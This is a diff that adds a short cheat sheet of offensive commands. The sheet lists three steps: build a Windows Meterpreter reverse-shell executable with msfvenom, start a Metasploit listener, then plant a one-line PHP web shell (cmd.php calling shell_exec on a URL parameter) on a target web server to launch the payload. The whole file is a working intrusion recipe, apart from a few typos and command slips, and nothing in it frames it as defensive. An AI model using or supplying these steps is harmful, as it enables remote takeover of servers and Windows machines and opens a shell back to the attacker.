@@ -1,0 +1,15 @@
+1. create metepreter reverse shell exe
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
+
+2. Setup listener
+msfconsole
+use exploit/multi/handle
+use windows/meterpreter/reverse_tcp
+set LPORT=
+set LHOST=
+Run
+
+3. To execute shell.exe on webserver use this:
+<?php echo shell_exec($_GET['cmd']);?>
+save to cmd.php
+http://target/cmd.php?cmd=shell.exe
